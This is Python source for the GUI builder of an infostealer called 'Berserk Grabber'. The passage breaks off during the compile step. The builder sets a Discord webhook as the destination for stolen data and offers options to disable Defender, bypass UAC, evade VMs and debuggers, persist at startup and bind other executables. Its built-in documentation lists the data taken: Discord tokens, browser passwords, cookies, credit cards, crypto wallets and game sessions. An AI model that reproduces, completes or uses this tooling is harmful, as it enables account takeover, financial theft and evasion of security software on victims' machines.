import base64
import copy
import os
import random
import re
import shutil
import string
import subprocess
import sys
import threading
import time
from tkinter import filedialog, messagebox

import customtkinter
import requests
from PIL import Image

# Theme & colors (apply before window)
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("dark-blue")
GUI_ACCENT = "#dc2626"
GUI_ACCENT_HOVER = "#b91c1c"
GUI_NAV_BG = "#1e1e2e"
GUI_CARD_BG = "#252536"
GUI_SECTION_FG = "#f87171"

try:
    import colorama
    colorama.init(autoreset=True)
    _CLR = {"step": colorama.Fore.CYAN + "[" + colorama.Fore.WHITE + "*" + colorama.Fore.CYAN + "] ",
            "ok": colorama.Fore.GREEN + "[" + colorama.Fore.WHITE + "+" + colorama.Fore.GREEN + "] ",
            "warn": colorama.Fore.YELLOW + "[" + colorama.Fore.WHITE + "!" + colorama.Fore.YELLOW + "] ",
            "title": colorama.Fore.MAGENTA}
except Exception:
    _CLR = {"step": "[*] ", "ok": "[+] ", "warn": "[!] ", "title": ""}


def _log(msg, kind="step"):
    s = _CLR.get(kind, _CLR["step"]) + str(msg)
    print(s, flush=True)
    sys.stdout.flush()


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("Berserk Grabber Builder")
        self.geometry("1080x620")
        self.minsize(920, 560)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "error": False,
            "startup": False,
            "defender": False,
            "block_av_sites": False,
            "systeminfo": False,
            "backupcodes": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "minecraft": False,
            "wifi": False,
            "killprotector": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False,
            "crypto": False,
            "autofills": False,
            "common_files": False,
            "mutex": False,
            "uac_bypass": False,
            "growtopia": False,
            "bound_exe": False,
            "bound_run_startup": False
        }

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "gui_images")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        # Logo dans la barre latérale (Berserk.png -> logo.png -> vyroo.png)
        logo_png = None
        for name in ("Berserk.png", "logo.png", "vyroo.png"):
            p = os.path.join(image_path, name)
            if os.path.isfile(p):
                logo_png = p
                break
        if logo_png:
            _pil = Image.open(logo_png)
            self.logo_image = customtkinter.CTkImage(light_image=_pil, dark_image=_pil, size=(72, 72))
        else:
            self.logo_image = None
        # Icônes nav optionnelles (home, clipboard, help)
        def _img(path_name, size):
            p = os.path.join(image_path, path_name)
            if os.path.isfile(p):
                return customtkinter.CTkImage(dark_image=Image.open(p), size=size)
            return None
        self.dashboard_image = _img("home.png", (30, 30))
        self.docs_image = _img("clipboard.png", (30, 30))
        self.help_image = _img("help.png", (20, 20))
        self.font = "Supernova"
        self.iconpath = None
        # Icône fenêtre optionnelle
        for name in ("Berserk.ico", "logo.ico", "vyroo.ico"):
            ico_path = os.path.join(image_path, name)
            if os.path.isfile(ico_path):
                self.iconbitmap(ico_path)
                break

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color=GUI_NAV_BG, width=240)
        self.navigation_frame.grid(row=0, column=0, sticky="ns")
        self.navigation_frame.grid_propagate(False)
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        nav_label_kw = dict(
            text="Berserk Builder",
            font=customtkinter.CTkFont(size=15, weight="bold", family=self.font),
            text_color=("gray90", "gray90"),
            wraplength=220)
        if self.logo_image:
            nav_label_kw["image"] = self.logo_image
            nav_label_kw["compound"] = "left"
        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, **nav_label_kw)
        self.navigation_frame_label.grid(row=0, column=0, padx=12, pady=24, sticky="w")

        self.dashboard_button = customtkinter.CTkButton(
            self.navigation_frame, corner_radius=8, height=44, border_spacing=12, text="Builder",
            font=customtkinter.CTkFont(family=self.font, size=14), fg_color="transparent",
            text_color=("gray10", "gray90"), hover_color=(GUI_ACCENT, GUI_ACCENT),
            image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew", padx=12, pady=4)

        self.frame_2_button = customtkinter.CTkButton(
            self.navigation_frame, corner_radius=8, height=44, border_spacing=12, text="Documentation",
            font=customtkinter.CTkFont(family=self.font, size=14), fg_color="transparent",
            text_color=("gray10", "gray90"), hover_color=(GUI_ACCENT, GUI_ACCENT),
            image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew", padx=12, pady=4)

        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.builder_frame.grid(row=0, column=1, sticky="nsew")
        self.builder_frame.grid_columnconfigure(0, weight=1)
        self.builder_frame.grid_rowconfigure(0, minsize=70)
        self.builder_frame.grid_rowconfigure(1, weight=1)

        # Webhook row: entry expands, button fixed (responsive)
        self._webhook_frm = customtkinter.CTkFrame(self.builder_frame, fg_color="transparent")
        self._webhook_frm.grid(row=0, column=0, sticky="ew", padx=16, pady=16)
        self._webhook_frm.grid_columnconfigure(0, weight=1)
        self.webhook_button = customtkinter.CTkEntry(self._webhook_frm, height=38, font=customtkinter.CTkFont(
            size=14, family=self.font), placeholder_text="https://discord.com/api/webhooks/...")
        self.webhook_button.grid(row=0, column=0, sticky="ew", padx=(0, 10), pady=0)
        self.checkwebhook_button = customtkinter.CTkButton(self._webhook_frm, width=120, height=38, text="Check Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, font=customtkinter.CTkFont(size=14, family=self.font))
        self.checkwebhook_button.grid(row=0, column=1, sticky="e", padx=0, pady=0)

        self._scroll = customtkinter.CTkScrollableFrame(self.builder_frame, fg_color="transparent")
        self._scroll.grid(row=1, column=0, sticky="nsew", padx=16, pady=(0, 16))
        self._scroll.grid_columnconfigure(0, weight=1)

        # Cadre options (fond carte, texte des cases visible)
        self._opt = customtkinter.CTkFrame(self._scroll, fg_color=GUI_CARD_BG, corner_radius=12)
        self._opt.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
        self._opt.grid_columnconfigure(0, weight=1)
        for c in range(4):
            self._opt.grid_columnconfigure(c, weight=1, minsize=180)

        # Titre + bouton aide
        self.all_options = customtkinter.CTkLabel(self._opt, text="Builder Options", font=customtkinter.CTkFont(size=24, weight="bold", family=self.font), text_color=GUI_SECTION_FG)
        self.all_options.grid(row=0, column=0, columnspan=3, sticky="nw", padx=20, pady=(20, 8))
        self.option_help = customtkinter.CTkButton(self._opt, width=36, height=36, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.option_help.grid(row=0, column=3, sticky="ne", padx=24, pady=(16, 8))

        # Ligne 1 : Ping + type
        self.ping = customtkinter.CTkCheckBox(self._opt, text="Ping", font=customtkinter.CTkFont(size=15, family=self.font),
                                              command=self.check_ping, fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.ping.grid(row=1, column=0, sticky="nw", padx=24, pady=6)
        self.pingtype = customtkinter.CTkOptionMenu(self._opt, width=100, values=["Everyone", "Here"],
            font=customtkinter.CTkFont(size=14, family=self.font), fg_color=GUI_ACCENT, button_hover_color=GUI_ACCENT_HOVER, button_color=GUI_ACCENT)
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=1, sticky="nw", padx=24, pady=6)
        self.pingtype.configure(state="disabled")

        # Ligne 2 : Fake Error, Startup, Defender, Block AV
        self.error = customtkinter.CTkCheckBox(self._opt, text="Fake Error", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.error.grid(row=2, column=0, sticky="nw", padx=24, pady=6)
        self.startup = customtkinter.CTkCheckBox(self._opt, text="Add To Startup", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.startup.grid(row=2, column=1, sticky="nw", padx=24, pady=6)
        self.defender = customtkinter.CTkCheckBox(self._opt, text="Disable Defender", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.defender.grid(row=2, column=2, sticky="nw", padx=24, pady=6)
        self.block_av_sites = customtkinter.CTkCheckBox(self._opt, text="Block AV Sites", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.block_av_sites.grid(row=2, column=3, sticky="nw", padx=24, pady=6)

        # Ligne 3 : Kill Protector, Anti Debug/Vm, Discord Info, Wifi Info
        self.killprotector = customtkinter.CTkCheckBox(self._opt, text="Kill Protector", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.killprotector.grid(row=3, column=0, sticky="nw", padx=24, pady=6)
        self.antidebug_vm = customtkinter.CTkCheckBox(self._opt, text="Anti Debug/Vm", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.antidebug_vm.grid(row=3, column=1, sticky="nw", padx=24, pady=6)
        self.discord = customtkinter.CTkCheckBox(self._opt, text="Discord Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.discord.grid(row=3, column=2, sticky="nw", padx=24, pady=6)
        self.wifi = customtkinter.CTkCheckBox(self._opt, text="Wifi Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.wifi.grid(row=3, column=3, sticky="nw", padx=24, pady=6)

        # Ligne 4 : Minecraft, Crypto & Apps, System Info, 2FA Codes
        self.minecraft = customtkinter.CTkCheckBox(self._opt, text="Minecraft Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.minecraft.grid(row=4, column=0, sticky="nw", padx=24, pady=6)
        self.crypto = customtkinter.CTkCheckBox(self._opt, text="Crypto & Apps", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.crypto.grid(row=4, column=1, sticky="nw", padx=24, pady=6)
        self.systeminfo = customtkinter.CTkCheckBox(self._opt, text="System Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.systeminfo.grid(row=4, column=2, sticky="nw", padx=24, pady=6)
        self.backupcodes = customtkinter.CTkCheckBox(self._opt, text="2FA Codes", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.backupcodes.grid(row=4, column=3, sticky="nw", padx=24, pady=6)

        # Ligne 5 : Browser, Roblox, Obfuscation, Injection
        self.browser = customtkinter.CTkCheckBox(self._opt, text="Browser Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.browser.grid(row=5, column=0, sticky="nw", padx=24, pady=6)
        self.roblox = customtkinter.CTkCheckBox(self._opt, text="Roblox Info", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, command=self.check_roblox)
        self.roblox.grid(row=5, column=1, sticky="nw", padx=24, pady=6)
        self.obfuscation = customtkinter.CTkCheckBox(self._opt, text="Obfuscation", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, command=self.check_cxfreeze)
        self.obfuscation.grid(row=5, column=2, sticky="nw", padx=24, pady=6)
        self.injection = customtkinter.CTkCheckBox(self._opt, text="Injection", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.injection.grid(row=5, column=3, sticky="nw", padx=24, pady=6)

        # Ligne 6 : Anti Spam, Self Destruct, File Pumper, Pump size
        self.antispam = customtkinter.CTkCheckBox(self._opt, text="Anti Spam", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.antispam.grid(row=6, column=0, sticky="nw", padx=24, pady=6)
        self.self_destruct = customtkinter.CTkCheckBox(self._opt, text="Self Destruct", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.self_destruct.grid(row=6, column=1, sticky="nw", padx=24, pady=6)
        self.pump = customtkinter.CTkCheckBox(self._opt, text="File Pumper", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, command=self.check_pumper)
        self.pump.grid(row=6, column=2, sticky="nw", padx=24, pady=6)
        self.pump_size = customtkinter.CTkOptionMenu(self._opt, width=90, font=customtkinter.CTkFont(size=14, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color=GUI_ACCENT, button_hover_color=GUI_ACCENT_HOVER, button_color=GUI_ACCENT)
        self.pump_size.grid(row=6, column=3, sticky="nw", padx=24, pady=6)
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        # Ligne 7 : Autofills, Common Files, Mutex, UAC Bypass
        self.autofills = customtkinter.CTkCheckBox(self._opt, text="Autofills", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.autofills.grid(row=7, column=0, sticky="nw", padx=24, pady=6)
        self.common_files = customtkinter.CTkCheckBox(self._opt, text="Common Files", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.common_files.grid(row=7, column=1, sticky="nw", padx=24, pady=6)
        self.mutex_cb = customtkinter.CTkCheckBox(self._opt, text="Single instance (Mutex)", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.mutex_cb.grid(row=7, column=2, sticky="nw", padx=24, pady=6)
        self.uac_bypass = customtkinter.CTkCheckBox(self._opt, text="UAC Bypass", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.uac_bypass.grid(row=7, column=3, sticky="nw", padx=24, pady=6)

        # Ligne 8 : Growtopia, Bound exe on startup, Bind EXE
        self.growtopia = customtkinter.CTkCheckBox(self._opt, text="Growtopia Session", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.growtopia.grid(row=8, column=0, sticky="nw", padx=24, pady=6)
        self.bound_run_startup = customtkinter.CTkCheckBox(self._opt, text="Bound exe on startup", font=customtkinter.CTkFont(size=15, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
        self.bound_run_startup.grid(row=8, column=1, sticky="nw", padx=24, pady=6)
        self.bound_exe_path = ""
        self.bind_exe_btn = customtkinter.CTkButton(self._opt, width=160, height=32, text="Bind EXE", fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, font=customtkinter.CTkFont(size=14, family=self.font), command=self.toggle_bind_exe)
        self.bind_exe_btn.grid(row=8, column=2, sticky="nw", padx=24, pady=6)

        # Section Build
        _section = customtkinter.CTkLabel(self._opt, text="Build", font=customtkinter.CTkFont(size=18, weight="bold", family=self.font), text_color=GUI_SECTION_FG)
        _section.grid(row=9, column=0, columnspan=4, sticky="nw", padx=20, pady=(20, 8))

        # Ligne 10 : File options, Add Icon
        self.fileopts = customtkinter.CTkOptionMenu(self._opt, values=["pyinstaller", "cxfreeze", ".py"], font=customtkinter.CTkFont(size=18, family=self.font), width=220, height=42, fg_color=GUI_ACCENT, button_hover_color=GUI_ACCENT_HOVER, button_color=GUI_ACCENT, command=self.multi_commands)
        self.fileopts.grid(row=10, column=0, columnspan=2, sticky="nw", padx=24, pady=8)
        self.fileopts.set("File Options")
        self.icon = customtkinter.CTkButton(self._opt, width=160, height=42, text="Add Icon", fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, font=customtkinter.CTkFont(size=18, family=self.font), command=self.get_icon)
        self.icon.grid(row=10, column=2, sticky="nw", padx=24, pady=8)
        self.icon.configure(state="disabled")

        # Ligne 11 : File Name, Build
        self.filename = customtkinter.CTkEntry(self._opt, width=280, height=42, font=customtkinter.CTkFont(size=18, family=self.font), placeholder_text="File Name")
        self.filename.grid(row=11, column=0, columnspan=2, sticky="nw", padx=24, pady=8)
        self.build = customtkinter.CTkButton(self._opt, width=200, height=48, text="Build", font=customtkinter.CTkFont(size=22, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, command=self.buildfile)
        self.build.grid(row=11, column=2, sticky="nw", padx=24, pady=8)

        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.block_av_sites, self.systeminfo, self.backupcodes, self.browser,
                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.crypto, self.autofills, self.common_files, self.mutex_cb, self.uac_bypass,
                           self.growtopia, self.bound_run_startup, self.killprotector, self.antidebug_vm, self.discord]

        for checkbox in self.checkboxes:
            checkbox.bind("<Button-1>", self.update_config)

        # Frame 2

        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)
        self.second_frame.grid_rowconfigure(1, weight=1)

        self.docs = customtkinter.CTkLabel(self.second_frame, text="Documentation", font=customtkinter.CTkFont(size=28, weight="bold", family=self.font), text_color=GUI_SECTION_FG)
        self.docs.grid(row=0, column=0, sticky="nw", padx=24, pady=20)

        self.docsbox = customtkinter.CTkTextbox(self.second_frame, font=customtkinter.CTkFont(size=13, family=self.font), corner_radius=10, border_width=1, fg_color=GUI_CARD_BG)
        self.docsbox.grid(row=1, column=0, sticky="nsew", padx=24, pady=(8, 24))
        self.docsbox.insert(
            "0.0",
            "=== FEATURES (what this grabber can collect) ===\n\n"
            "Discord Information: Nitro, Badges, Billing, Email, Phone, Display Name, HQ Friends (friends with badges), HQ Guilds (servers you own/admin with invite link), Gift Codes (promo + Nitro gifts), Token. Per-account embed.\n\n"
            "Browser Data: Cookies, Passwords, History, Download history, Credit cards, Bookmarks, Autofills (Chrome, Edge, Brave, Opera GX, and more).\n\n"
            "Roblox Information: From Chrome, Edge, Brave, Opera GX, etc. (username, cookie, Robux).\n\n"
            "Crypto & Apps: Session/data files from crypto wallets (Exodus, Atomic, etc.) and from Steam, Riot Games, Epic Games, Rockstar Games, Telegram. Saved in Session Files.\n\n"
            "Discord Injection: Sends token, password, email on login; credit card/PayPal added; nitro bought; password/mail changed.\n\n"
            "System Information: PC user, name, OS, IP, MAC, HWID, CPU, GPU, RAM, and list of detected antivirus software.\n\n"
            "Anti-debug: Exits in VM/sandbox (HWID, IP, MAC, registry, DLL, low RAM/disk, RDP, blacklisted processes).\n\n"
            "Startup: Copies stub to Startup folder.\n\n"
            "--- BUILDER OPTIONS ---\n\n"
            "Add To Startup: Adds the file to the startup folder.\n\n"
            "Fake Error: Fake error popup when the file is run.\n\n"
            "Ping / Ping Type: @everyone or @here when data is sent.\n\n"
            "System Info: PC name, OS, IP, MAC, HWID, CPU, GPU, RAM, Antivirus list.\n\n"
            "2FA Codes: Discord backup codes.\n\n"
            "Browser Info: Passwords, history, downloads, cookies, credit cards, bookmarks.\n\n"
            "Roblox Info: Username, cookie, Robux (requires Browser).\n\n"
            "Crypto & Apps: Wallets + Steam, Riot, Epic, Rockstar, Telegram (Session Files).\n\n"
            "Autofills: Browser autofill data (requires Browser).\n\n"
            "Common Files: Desktop, Documents, Downloads, OneDrive, Recent — files matching keywords or common extensions, under 2 MB.\n\n"
            "Single instance (Mutex): Only one instance runs at a time.\n\n"
            "UAC Bypass: Runs as admin via fodhelper (exe only).\n\n"
            "Growtopia Session: save.dat via Start Menu shortcut.\n\n"
            "Bind EXE: Embeds an exe (max 20 MB); optional startup copy.\n\n"
            "Obfuscation: Obfuscates source.\n\n"
            "Injection: Discord injection script.\n\n"
            "Minecraft / Wifi: Session cache and WiFi passwords.\n\n"
            "Kill Protector: Bypasses Discord token protector.\n\n"
            "Block AV Sites: Blocks VT, Any.Run, etc. in hosts (admin).\n\n"
            "Anti Debug/VM: Exit in sandbox/VM/debugger.\n\n"
            "Discord Info: Full embed per token (HQ Friends, HQ Guilds, Gift Codes).\n\n"
            "Anti Spam / Self Destruct / File Pumper / Build: PyInstaller or CxFreeze.")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=(GUI_ACCENT, GUI_ACCENT) if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=(GUI_ACCENT, GUI_ACCENT) if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def dark_mode(self):
        customtkinter.set_appearance_mode("dark")

    def verify_webhook(self):
        webhook = (self.webhook_button.get() or "").strip()
        if not webhook:
            return False
        if not webhook.startswith("https://discord.com/api/webhooks/") or len(webhook) < 50:
            return False
        try:
            r = requests.get(webhook, timeout=8)
            return r.status_code in (200, 204)
        except requests.exceptions.RequestException:
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=110, height=38, fg_color="#22c55e", hover_color="#16a34a",
                                               text="Valid Webhook", font=customtkinter.CTkFont(size=14, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(width=110, height=38, fg_color="#dc2626", hover_color="#b91c1c",
                                               text="Invalid Webhook", font=customtkinter.CTkFont(size=14, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def multi_commands(self, value):
        if value == "pyinstaller":
            self.check_icon()
        elif value == "cxfreeze":
            self.check_cxfreeze()
            self.check_icon()
        elif value == ".py":
            self.check_icon()

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()

    def check_icon(self):
        if self.fileopts.get() == "pyinstaller":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == "cxfreeze":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == ".py":
            self.icon.configure(state="disabled")

    def check_cxfreeze(self):
        if self.fileopts.get() == "cxfreeze":
            if self.obfuscation.get() == 1:
                self.obfuscation.deselect()

    def get_icon(self):
        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
        self.icon.configure(text="Added Icon")
        self.builder_frame.after(3500, self.reset_icon_button)

    def reset_icon_button(self):
        self.icon.configure(width=160, height=42, text="Add Icon", fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER,
                            font=customtkinter.CTkFont(size=18, family=self.font), command=self.get_icon)

    def update_config(self, event):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "error": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "block_av_sites": self.block_av_sites,
            "systeminfo": self.systeminfo,
            "backupcodes": self.backupcodes,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "minecraft": self.minecraft,
            "wifi": self.wifi,
            "killprotector": self.killprotector,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct,
            "crypto": self.crypto,
            "autofills": self.autofills,
            "common_files": self.common_files,
            "mutex": self.mutex_cb,
            "uac_bypass": self.uac_bypass,
            "growtopia": self.growtopia,
            "bound_run_startup": self.bound_run_startup
        }

        for key, checkbox in checkbox_mapping.items():
            if key == "webhook":
                continue
            if key == "mutex":
                if checkbox.get():
                    self.updated_dictionary["mutex"] = "".join(random.choices(string.ascii_letters + string.digits, k=16))
                else:
                    self.updated_dictionary["mutex"] = False
                continue
            if checkbox.get():
                self.updated_dictionary[key] = True
            else:
                self.updated_dictionary[key] = False
        ping_message = self.pingtype.get()
        if ping_message in ["Here", "Everyone"]:
            self.updated_dictionary["pingtype"] = ping_message
        elif self.ping.get() == 0:
            self.updated_dictionary["pingtype"] = "None"

    def toggle_bind_exe(self):
        if self.bound_exe_path:
            self.bound_exe_path = ""
            self.bind_exe_btn.configure(text="Bind EXE")
        else:
            path = filedialog.askopenfilename(title="Select EXE to bind", filetypes=(("Executable", "*.exe"), ("All", "*.*")))
            if path and os.path.isfile(path):
                try:
                    size = os.path.getsize(path)
                    if size > 20 * 1024 * 1024:
                        messagebox.showwarning("Bind EXE", "File too large (max 20 MB).")
                        return
                    self.bound_exe_path = path
                    self.bind_exe_btn.configure(text="Unbind EXE")
                except Exception:
                    messagebox.showerror("Bind EXE", "Could not read file.")

    def get_filetype(self):
        file_type = self.fileopts.get()
        if file_type == ".py":
            return file_type.replace(".", "")
        else:
            return file_type

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER, text="Check Webhook")

    def reset_build_button(self):
        self.build.configure(width=200, height=48, text="Build", font=customtkinter.CTkFont(size=22, family=self.font),
                             fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=200, text=f"Building{i}", font=customtkinter.CTkFont(size=22, family=self.font), fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)
                time.sleep(0.3)
                self.update()

    def built_file(self):
        self.build.configure(width=200, text="Built File", font=customtkinter.CTkFont(size=22, family=self.font),
                             fg_color=GUI_ACCENT, hover_color=GUI_ACCENT_HOVER)

    def return_filename(self):
        get_file_name = self.filename.get()
        if not get_file_name:
            random_name = ''.join(random.choices(string.ascii_letters, k=5))
            return f"test-{random_name}"
        else:
            return get_file_name

    def get_config(self):
        with open(self.basefilepath + "\\Berserk.py", 'r', encoding="utf-8") as f:
            code = f.read()

        config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
        config_match = re.search(config_regex, code, re.DOTALL)
        if config_match:
            config = config_match.group(0)
        else:
            raise Exception("Could not find config in Berserk.py")

        copy_dict = copy.deepcopy(self.updated_dictionary)
        if self.bound_exe_path and os.path.isfile(self.bound_exe_path):
            try:
                with open(self.bound_exe_path, "rb") as f:
                    data = f.read()
                if len(data) <= 20 * 1024 * 1024:
                    copy_dict["bound_exe"] = base64.b64encode(data).decode("ascii")
                else:
                    copy_dict["bound_exe"] = False
            except Exception:
                copy_dict["bound_exe"] = False
        else:
            copy_dict["bound_exe"] = False
        copy_dict["bound_run_startup"] = bool(self.bound_run_startup.get() if hasattr(self, "bound_run_startup") else False)
        config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
        code = code.replace(config, config_str)

        return code

    def file_pumper(self, filename, extension, size):
        pump_size = size * 1024 ** 2
        with open(f"./{filename}.{extension}", 'ab') as f:
            for _ in range(int(pump_size)):
                f.write((b'\x00'))

    def compile_file(self, filename, filetype):
        if self.iconpath is None:
            exeicon = "NONE"
        else:
            exeicon = self.iconpath

        if filetype == "pyinstaller":
            _log("Compilation PyInstaller (onefile) en cours, patientez...", "step")
            _devnull = subprocess.DEVNULL
            subprocess.run(["python", "-m", "PyInstaller",
                            "--onefile", "--clean", "--noconsole", "--noupx",
                            "--distpath=./",
                            "--hidden-import", "base64",
                            "--hidden-import", "binascii",
                            "--hidden-import", "concurrent.futures",
                            "--hidden-import", "csv",
                            "--hidden-import", "ctypes",
                            "--hidden-import", "json",
                            "--hidden-import", "multiprocessing",
                            "--hidden-import", "os",
                            "--hidden-import", "random",
                            "--hidden-import", "re",
                            "--hidden-import", "shutil",
                            "--hidden-import", "sqlite3",
                            "--hidden-import", "subprocess",
                            "--hidden-import", "sys",
                            "--hidden-import", "threading",
                            "--hidden-import", "time",
                            "--hidden-import", "winreg",
                            "--hidden-import", "zipfile",
                            "--hidden-import", "requests",
                            "--hidden-import", "requests_toolbelt",
                            "--hidden-import", "requests_toolbelt.multipart.encoder",
                            "--hidden-import", "urllib3",
                            "--hidden-import", "certifi",
                            "--hidden-import", "charset_normalizer",
                            "--hidden-import", "idna",
                            "--hidden-import", "psutil",
                            "--hidden-import", "PIL",
                            "--hidden-import", "PIL.Image",
                            "--hidden-import", "PIL.ImageGrab",
                            "--hidden-import", "Cryptodome",
                            "--hidden-import", "Cryptodome.Cipher",
                            "--hidden-import", "Cryptodome.Cipher.AES",
                            "--hidden-import", "win32crypt",
                            "--hidden-import", "cv2",
                            "--collect-all", "requests_toolbelt",
                            "--collect-all", "requests",
                            "--icon", exeicon, f"./{filename}.py"],
                            stdout=_devnull, stderr=_devnull)
            _log("PyInstaller termine. Executable : " + filename + ".exe", "ok")

        elif filetype == "cxfreeze":
            _log("Compilation cx_Freeze en cours, patientez...", "step")
            cmd_args = [
                "cxfreeze",
                f"{filename}.py",
